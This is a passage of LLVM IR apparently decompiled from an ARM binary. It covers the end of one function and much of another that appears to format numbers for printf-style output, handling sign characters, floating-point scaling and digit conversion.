  %v2_11624 = add i32 %v3_1161c, %v0_11624
  %extract.t6 = trunc i32 %v2_11624 to i8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1161c, %bb18
  %v0_1163c.off0 = phi i8 [ %extract.t, %dec_label_pc_1161c ], [ %extract.t6, %bb18 ]
  %v0_11638 = load i32, i32* %r6.global-to-local, align 4
  %v1_11638 = load i32, i32* %sl.global-to-local, align 4
  %v2_11638 = or i32 %v1_11638, %v0_11638
  %v4_11638 = icmp eq i32 %v2_11638, 0
  store i1 %v4_11638, i1* %cpsr_z.global-to-local, align 1
  %v3_1163c = inttoptr i32 %v1_11630 to i8*
  store i8 %v0_1163c.off0, i8* %v3_1163c, align 1
  %v0_11640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11640, label %dec_label_pc_11644, label %dec_label_pc_11590thread-pre-split

dec_label_pc_11644:                               ; preds = %bb19
  %v2_11644 = load i8, i8* %stack_var_-40, align 1
  %v2_11648 = icmp eq i8 %v2_11644, 0
  store i1 %v2_11648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11648, label %dec_label_pc_11644..thread2_crit_edge, label %bb20

dec_label_pc_11644..thread2_crit_edge:            ; preds = %dec_label_pc_11644
  %v0_11654.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb20:                                             ; preds = %dec_label_pc_11644
  %v3_11650 = load i32, i32* %r8.global-to-local, align 4
  %v4_11650 = add i32 %v3_11650, -1
  %v5_11650 = inttoptr i32 %v4_11650 to i8*
  store i8 45, i8* %v5_11650, align 1
  %v6_11650 = load i32, i32* %r8.global-to-local, align 4
  %v7_11650 = add i32 %v6_11650, -1
  store i32 %v7_11650, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11644..thread2_crit_edge, %bb20
  %v0_11654 = phi i32 [ %v0_11654.pre, %dec_label_pc_11644..thread2_crit_edge ], [ %v7_11650, %bb20 ]
  ret i32 %v0_11654

; uselistorder directives
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 0, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 5, 2, 3, 4, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_1161c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_11554, { 1, 0 }
}

define i32 @function_11660(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11660:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11660 = load i32, i32* @r4, align 4
  store i32 %v3_11660, i32* %stack_var_-36, align 4
  %v6_11660 = load i32, i32* @r5, align 4
  %v9_11660 = load i32, i32* @r6, align 4
  %v12_11660 = load i32, i32* @r7, align 4
  %v15_11660 = load i32, i32* @r8, align 4
  %v18_11660 = load i32, i32* @sb, align 4
  %v21_11660 = load i32, i32* @sl, align 4
  %v1_11664 = add i32 %tmp, 8
  %v2_11664 = inttoptr i32 %v1_11664 to i8*
  %v3_11664 = load i8, i8* %v2_11664, align 1
  %v4_11664 = zext i8 %v3_11664 to i32
  store i32 %v4_11664, i32* @sl, align 4
  store i32 %tmp, i32* %stack_var_-200, align 4
  %v1_11670 = or i32 %v4_11664, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11674 = icmp ult i32 %v1_11670, 97
  store i1 %v6_11674, i1* %cpsr_n.global-to-local, align 1
  %v7_11674 = icmp eq i32 %v1_11670, 97
  store i1 %v7_11674, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11688 = load i32, i32* %arg4, align 4
  store i32 %v2_11688, i32* %r1.global-to-local, align 4
  br i1 %v7_11674, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11660
  %v2_1168c = add nuw nsw i32 %v4_11664, 6
  store i32 %v2_1168c, i32* %r3.global-to-local, align 4
  %v2_11694 = urem i32 %v2_1168c, 256
  store i32 %v2_11694, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11660, %bb
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %v2_11688, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_116ac = add i32 %tmp, 12
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r2.global-to-local, align 4
  %v1_116b0 = add i32 %tmp, 4
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  store i32 %v3_116b0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_116b4 = icmp slt i32 %v2_11688, 0
  store i1 %v1_116b4, i1* %cpsr_n.global-to-local, align 1
  %v2_116b4 = icmp eq i32 %v2_11688, 0
  store i1 %v2_116b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_116b4, label %bb221, label %bb222

bb221:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.thread, %bb221
  %v1_11a14 = phi i32 [ %v2_11688, %.thread ], [ 6, %bb221 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_116c0 = and i32 %v3_116ac, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_116c0 = icmp eq i32 %v1_116c0, 0
  store i1 %v2_116c0, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_116c0, label %dec_label_pc_116d8, label %dec_label_pc_116e4

dec_label_pc_116d8:                               ; preds = %bb222
  %v1_116d8 = urem i32 %v3_116ac, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_116d8 = icmp eq i32 %v1_116d8, 0
  store i1 %v2_116d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116d8, label %dec_label_pc_116e8, label %dec_label_pc_116e4

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116d8, %bb222
  %storemerge = phi i32 [ 43, %bb222 ], [ 32, %dec_label_pc_116d8 ]
  %v0_116e4.off0 = phi i8 [ 43, %bb222 ], [ 32, %dec_label_pc_116d8 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_116e4.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_116e8

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116d8, %dec_label_pc_116e4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_11704 = call i32 @function_155c0()
  store i32 %v0_11704, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11708 = icmp slt i32 %v0_11704, 0
  store i1 %v1_11708, i1* %cpsr_n.global-to-local, align 1
  %v2_11708 = icmp eq i32 %v0_11704, 0
  store i1 %v2_11708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11708, label %dec_label_pc_11718, label %bb224

bb224:                                            ; preds = %dec_label_pc_116e8
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_117cc

dec_label_pc_11718:                               ; preds = %dec_label_pc_116e8
  %v0_11718 = load i32, i32* @r6, align 4
  store i32 %v0_11718, i32* @r0, align 4
  %v0_1171c = load i32, i32* @r7, align 4
  store i32 %v0_1171c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11728 = call i32 @function_155c0()
  store i32 %v0_11728, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1172c = icmp slt i32 %v0_11728, 0
  store i1 %v1_1172c, i1* %cpsr_n.global-to-local, align 1
  %v2_1172c = icmp eq i32 %v0_11728, 0
  store i1 %v2_1172c, i1* %cpsr_z.global-to-local, align 1
  %v0_11734 = load i32, i32* @r6, align 4
  br i1 %v2_1172c, label %dec_label_pc_11734, label %dec_label_pc_11774

dec_label_pc_11734:                               ; preds = %dec_label_pc_11718
  store i32 %v0_11734, i32* %r2.global-to-local, align 4
  %v0_11738 = load i32, i32* @r7, align 4
  store i32 %v0_11738, i32* %r3.global-to-local, align 4
  store i32 1072693248, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_11744 = call i32 @function_153ac(i32 1072693248, i32 0, i32 %v0_11734, i32 %v0_11738)
  store i32 %v4_11744, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v1_11750 = call i32 @function_155b8(i32 %v4_11744)
  store i32 %v1_11750, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11754 = icmp slt i32 %v1_11750, 0
  store i1 %v1_11754, i1* %cpsr_n.global-to-local, align 1
  %v2_11754 = icmp eq i32 %v1_11750, 0
  store i1 %v2_11754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11754, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_11734
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1193c

bb226:                                            ; preds = %dec_label_pc_11734
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  br label %dec_label_pc_1193c

dec_label_pc_11774:                               ; preds = %dec_label_pc_11718
  store i32 %v0_11734, i32* @r0, align 4
  %v0_11778 = load i32, i32* @r7, align 4
  store i32 %v0_11778, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_11784 = call i32 @function_155b8(i32 %v0_11734)
  store i32 %v4_11784, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11788 = icmp slt i32 %v4_11784, 0
  store i1 %v1_11788, i1* %cpsr_n.global-to-local, align 1
  %v2_11788 = icmp eq i32 %v4_11784, 0
  store i1 %v2_11788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11788, label %bb227, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_11774
  %v0_117a4.pre = load i32, i32* @r6, align 4
  br label %bb228

bb227:                                            ; preds = %dec_label_pc_11774
  store i32 45, i32* %r2.global-to-local, align 4
  %v3_11790 = load i32, i32* @r6, align 4
  %v4_11790 = sub i32 0, %v3_11790
  store i32 %v4_11790, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-42, align 1
  store i32 %v4_11790, i32* @r6, align 4
  br label %bb228

bb228:                                            ; preds = %._crit_edge, %bb227
  %v0_117a4 = phi i32 [ %v0_117a4.pre, %._crit_edge ], [ %v4_11790, %bb227 ]
  store i32 1070596096, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_117a4, i32* %r0.global-to-local, align 4
  %v0_117a8 = load i32, i32* @r7, align 4
  store i32 %v0_117a8, i32* %r1.global-to-local, align 4
  %v4_117ac = call i32 @function_15084(i32 %v0_117a4, i32 %v0_117a8, i32 1070596096, i32 0)
  store i32 %v4_117ac, i32* %r2.global-to-local, align 4
  store i32 %v0_117a8, i32* %r3.global-to-local, align 4
  %v0_117b8 = load i32, i32* @r6, align 4
  store i32 %v0_117b8, i32* @r0, align 4
  %v0_117bc = load i32, i32* @r7, align 4
  store i32 %v0_117bc, i32* %r1.global-to-local, align 4
  %v0_117c0 = call i32 @function_155c0()
  store i32 %v0_117c0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_117c4 = icmp slt i32 %v0_117c0, 0
  store i1 %v1_117c4, i1* %cpsr_n.global-to-local, align 1
  %v2_117c4 = icmp eq i32 %v0_117c0, 0
  store i1 %v2_117c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117c4, label %dec_label_pc_117cc, label %dec_label_pc_11810

dec_label_pc_117cc:                               ; preds = %bb224, %bb228
  %v0_116fc.v1_117108 = phi i32 [ 0, %bb228 ], [ 8, %bb224 ]
  %v2_117cc = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_117cc, i32* %ip.global-to-local, align 4
  %v2_117d4 = add i32 %v2_117cc, 16
  %v3_117d4 = inttoptr i32 %v2_117d4 to i32*
  store i32 32, i32* %v3_117d4, align 4
  %v0_117dc = load i32, i32* @sl, align 4
  %v1_117dc = add i32 %v0_117dc, -96
  %v3_117dc = sub i32 95, %v0_117dc
  %v4_117dc = and i32 %v3_117dc, %v0_117dc
  %v5_117dc = icmp slt i32 %v4_117dc, 0
  store i1 %v5_117dc, i1* %cpsr_v.global-to-local, align 1
  %v6_117dc = icmp slt i32 %v1_117dc, 0
  store i1 %v6_117dc, i1* %cpsr_n.global-to-local, align 1
  %v7_117dc = icmp eq i32 %v0_117dc, 96
  store i1 %v7_117dc, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp287 = icmp ult i32 %v0_117dc, 97
  br i1 %tmp287, label %bb229, label %.thread121

bb229:                                            ; preds = %dec_label_pc_117cc
  %v5_117f0 = or i32 %v0_116fc.v1_117108, 4
  store i32 %v5_117f0, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_117cc, %bb229
  %v4_117f4 = phi i32 [ %v5_117f0, %bb229 ], [ 3, %dec_label_pc_117cc ]
  %v4_117f4.v0_116fc.v1_11710 = select i1 %tmp287, i32 %v4_117f4, i32 %v0_116fc.v1_117108
  store i32 ptrtoint ([4 x i8]* @global_var_17bb4.528 to i32), i32* %r2.global-to-local, align 4
  %v2_11800 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_11800, i32* %r6.global-to-local, align 4
  %v2_11804 = add i32 %v4_117f4.v0_116fc.v1_11710, ptrtoint ([4 x i8]* @global_var_17bb4.528 to i32)
  store i32 %v2_11804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11d48

dec_label_pc_11810:                               ; preds = %bb228
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v0_11820 = load i32, i32* @r6, align 4
  store i32 %v0_11820, i32* @r4, align 4
  %v0_11824 = load i32, i32* @r7, align 4
  store i32 %v0_11824, i32* @r5, align 4
  store i32 256, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge, %dec_label_pc_11810
  %v0_11838 = phi i32 [ %v0_11820, %dec_label_pc_11810 ], [ %v0_11838.pre, %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge ]
  %v0_1182c = phi i32 [ %v0_11824, %dec_label_pc_11810 ], [ %v0_1182c.pre, %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_11810 ], [ %v1_11844, %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_11810 ], [ %stack_var_-192.5, %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge ]
  store i32 %v0_1182c, i32* @r1, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v0_11838, i32* @r0, align 4
  %v4_1183c = call i32 @function_155b8(i32 %v0_11838)
  %v1_11844 = add i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_17bc8.531 to i32), i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11854 = icmp slt i32 %v4_1183c, 0
  store i1 %v1_11854, i1* %cpsr_n.global-to-local, align 1
  %v2_11854 = icmp eq i32 %v4_1183c, 0
  store i1 %v2_11854, i1* %cpsr_z.global-to-local, align 1
  %v3_11858 = mul i32 %v1_11844, 8
  store i32 %v3_11858, i32* %r3.global-to-local, align 4
  %v0_1185c = load i32, i32* @r4, align 4
  store i32 %v0_1185c, i32* %r0.global-to-local, align 4
  %v0_11860 = load i32, i32* @r5, align 4
  store i32 %v0_11860, i32* %r1.global-to-local, align 4
  %v2_11864 = add i32 %v3_11858, ptrtoint (i32* @global_var_17bc8.531 to i32)
  store i32 %v2_11864, i32* %ip.global-to-local, align 4
  %v1_1186c = inttoptr i32 %v2_11864 to i32*
  %v2_1186c = load i32, i32* %v1_1186c, align 4
  store i32 %v2_1186c, i32* %r2.global-to-local, align 4
  %v3_1186c = add i32 %v3_11858, add (i32 ptrtoint (i32* @global_var_17bc8.531 to i32), i32 4)
  %v4_1186c = inttoptr i32 %v3_1186c to i32*
  %v5_1186c = load i32, i32* %v4_1186c, align 4
  store i32 %v5_1186c, i32* %r3.global-to-local, align 4
  br i1 %v1_11854, label %dec_label_pc_1186c, label %dec_label_pc_118a0

dec_label_pc_1186c:                               ; preds = %dec_label_pc_1182c
  %v5_11870 = call i32 @function_15084(i32 %v0_1185c, i32 %v0_11860, i32 %v2_1186c, i32 %v5_1186c)
  store i32 %v5_11870, i32* @r0, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_11870, i32* @r8, align 4
  store i32 %v0_11860, i32* @sb, align 4
  %v1_11884 = call i32 @function_155b8(i32 %v5_11870)
  store i32 %v1_11884, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11888 = icmp slt i32 %v1_11884, 0
  store i1 %v1_11888, i1* %cpsr_n.global-to-local, align 1
  %v2_11888 = icmp eq i32 %v1_11884, 0
  store i1 %v2_11888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11888, label %.thread124, label %dec_label_pc_118e0

.thread124:                                       ; preds = %dec_label_pc_1186c
  %v3_11890 = load i32, i32* %fp.global-to-local, align 4
  %v5_11890 = sub i32 %stack_var_-192.2, %v3_11890
  store i32 %v5_11890, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118d8

dec_label_pc_118a0:                               ; preds = %dec_label_pc_1182c
  store i32 %v0_1185c, i32* %r0.global-to-local, align 4
  store i32 %v0_11860, i32* %r1.global-to-local, align 4
  %v5_118ac = call i32 @function_153ac(i32 %v0_1185c, i32 %v0_11860, i32 %v2_1186c, i32 %v5_1186c)
  store i32 %v5_118ac, i32* @r0, align 4
  store i32 1100470148, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v5_118ac, i32* @r8, align 4
  store i32 %v0_11860, i32* @sb, align 4
  %v4_118c0 = call i32 @function_155b0(i32 %v5_118ac, i32 %v0_11860, i32 1100470148, i32 0)
  store i32 %v4_118c0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_118c4 = icmp slt i32 %v4_118c0, 0
  store i1 %v1_118c4, i1* %cpsr_n.global-to-local, align 1
  %v2_118c4 = icmp eq i32 %v4_118c0, 0
  store i1 %v2_118c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_118c4, label %dec_label_pc_118e0, label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118a0
  %v1_118d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_118d0 = add i32 %v1_118d0, %stack_var_-192.2
  store i32 %v2_118d0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %.thread124, %dec_label_pc_118cc
  %stack_var_-192.4 = phi i32 [ %v2_118d0, %dec_label_pc_118cc ], [ %v5_11890, %.thread124 ]
  %v0_118d8 = load i32, i32* @r8, align 4
  store i32 %v0_118d8, i32* @r4, align 4
  %v0_118dc = load i32, i32* @sb, align 4
  store i32 %v0_118dc, i32* @r5, align 4
  br label %dec_label_pc_118e0

dec_label_pc_118e0:                               ; preds = %dec_label_pc_1186c, %dec_label_pc_118a0, %dec_label_pc_118d8
  %stack_var_-192.5 = phi i32 [ %stack_var_-192.4, %dec_label_pc_118d8 ], [ %stack_var_-192.2, %dec_label_pc_118a0 ], [ %stack_var_-192.2, %dec_label_pc_1186c ]
  store i32 %v1_11844, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_118e4 = icmp slt i32 %v1_11844, 0
  store i1 %v1_118e4, i1* %cpsr_n.global-to-local, align 1
  %v2_118e4 = icmp eq i32 %v1_11844, 0
  store i1 %v2_118e4, i1* %cpsr_z.global-to-local, align 1
  %v0_118e8 = load i32, i32* %fp.global-to-local, align 4
  %v3_118e8 = sdiv i32 %v0_118e8, 2
  store i32 %v3_118e8, i32* %fp.global-to-local, align 4
  br i1 %v2_118e4, label %dec_label_pc_118f0, label %dec_label_pc_118e0.dec_label_pc_1182c_crit_edge

dec_label_pc_118e0.dec_label_pc_1182c_crit_edge:  ; preds = %dec_label_pc_118e0
  %v0_1182c.pre = load i32, i32* @r7, align 4
  %v0_11838.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1182c

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118e0
  %v0_118f0 = load i32, i32* @r4, align 4
  store i32 %v0_118f0, i32* @r0, align 4
  %v0_118f4 = load i32, i32* @r5, align 4
  store i32 %v0_118f4, i32* @r1, align 4
  store i32 1104006501, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v4_11900 = call i32 @function_155b0(i32 %v0_118f0, i32 %v0_118f4, i32 1104006501, i32 0)
  store i32 %v4_11900, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11904 = icmp slt i32 %v4_11900, 0
  store i1 %v1_11904, i1* %cpsr_n.global-to-local, align 1
  %v2_11904 = icmp eq i32 %v4_11900, 0
  store i1 %v2_11904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11904, label %.thread126, label %dec_label_pc_11914

.thread126:                                       ; preds = %dec_label_pc_118f0
  %v3_11908 = load i32, i32* @r4, align 4
  store i32 %v3_11908, i32* @r6, align 4
  %v3_1190c = load i32, i32* @r5, align 4
  store i32 %v3_1190c, i32* @r7, align 4
  br label %dec_label_pc_1193c

dec_label_pc_11914:                               ; preds = %dec_label_pc_118f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11918 = load i32, i32* @r4, align 4
  store i32 %v0_11918, i32* %r0.global-to-local, align 4
  %v0_1191c = load i32, i32* @r5, align 4
  store i32 %v0_1191c, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r2.global-to-local, align 4
  %v4_11924 = call i32 @function_153ac(i32 %v0_11918, i32 %v0_1191c, i32 1076101120, i32 0)
  store i32 %v4_11924, i32* %r0.global-to-local, align 4
  %v1_1192c = add i32 %stack_var_-192.5, 1
  store i32 %v1_1192c, i32* %r3.global-to-local, align 4
  store i32 %v4_11924, i32* @r6, align 4
  store i32 %v0_1191c, i32* @r7, align 4
  br label %dec_label_pc_1193c

dec_label_pc_1193c:                               ; preds = %.thread126, %bb225, %bb226, %dec_label_pc_11914
  %stack_var_-192.6 = phi i32 [ -1, %bb226 ], [ -1, %bb225 ], [ %v1_1192c, %dec_label_pc_11914 ], [ %stack_var_-192.5, %.thread126 ]
  %v2_1193c = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_1193c, i32* @sb, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_119d8, %dec_label_pc_1193c
  %v0_11944 = load i32, i32* @r7, align 4
  store i32 %v0_11944, i32* %r1.global-to-local, align 4
  %v0_11948 = load i32, i32* @r6, align 4
  store i32 %v0_11948, i32* %r0.global-to-local, align 4
  %v2_1194c = call i32 @function_156d8(i32 %v0_11948, i32 %v0_11944)
  store i32 %v2_1194c, i32* @r0, align 4
  store i32 %v2_1194c, i32* @r4, align 4
  %v0_11954 = call i32 @function_14f98()
  store i32 %v0_11954, i32* @r0, align 4
  %v0_11958 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11958 = icmp slt i32 %v0_11958, 0
  store i1 %v1_11958, i1* %cpsr_n.global-to-local, align 1
  %v2_11958 = icmp eq i32 %v0_11958, 0
  store i1 %v2_11958, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11954, i32* %r2.global-to-local, align 4
  store i32 %v0_11944, i32* %r3.global-to-local, align 4
  br i1 %v1_11958, label %dec_label_pc_11968, label %dec_label_pc_1197c

dec_label_pc_11968:                               ; preds = %dec_label_pc_11944
  store i32 1106247680, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_11970 = call i32 @function_14c90()
  store i32 %v0_11970, i32* %r0.global-to-local, align 4
  store i32 %v0_11970, i32* %r2.global-to-local, align 4
  store i32 %v0_11944, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11944, %dec_label_pc_11968
  %v0_1197c = load i32, i32* @r6, align 4
  store i32 %v0_1197c, i32* @r0, align 4
  %v0_11980 = load i32, i32* @r7, align 4
  store i32 %v0_11980, i32* %r1.global-to-local, align 4
  %v2_11984 = call i32 @function_14c8c(i32 %v0_1197c, i32 %v0_11980)
  store i32 %v2_11984, i32* %r0.global-to-local, align 4
  store i32 1104006501, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_11990 = call i32 @function_15084(i32 %v2_11984, i32 %v0_11980, i32 1104006501, i32 0)
  store i32 %v4_11990, i32* %r0.global-to-local, align 4
  %v0_11994 = load i32, i32* @sb, align 4
  %v1_11994 = add i32 %v0_11994, 9
  store i32 %v1_11994, i32* @sb, align 4
  store i32 %v4_11990, i32* @r6, align 4
  store i32 %v0_11980, i32* @r7, align 4
  store i32 0, i32* @r5, align 4
  %v0_119a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_1197c
  %v0_119a4 = phi i32 [ %v0_119c8, %dec_label_pc_119a4 ], [ %v0_119a4.pre, %dec_label_pc_1197c ]
  store i32 %v0_119a4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_119ac = call i32 @function_c864(i32 %v0_119a4, i32 10)
  %v0_119b0 = load i32, i32* @r5, align 4
  %v1_119b0 = add i32 %v0_119b0, 1
  store i32 %v1_119b0, i32* @r5, align 4
  %v1_119b4 = add i32 %v2_119ac, 48
  store i32 %v1_119b4, i32* %r2.global-to-local, align 4
  %v1_119b8 = load i32, i32* @sb, align 4
  %v2_119b8 = sub i32 %v1_119b8, %v1_119b0
  store i32 %v2_119b8, i32* %r3.global-to-local, align 4
  %v0_119bc = load i32, i32* @r4, align 4
  store i32 %v0_119bc, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v1_119c4 = trunc i32 %v1_119b4 to i8
  %v3_119c4 = inttoptr i32 %v2_119b8 to i8*
  store i8 %v1_119c4, i8* %v3_119c4, align 1
  %v0_119c8 = call i32 @function_14a34()
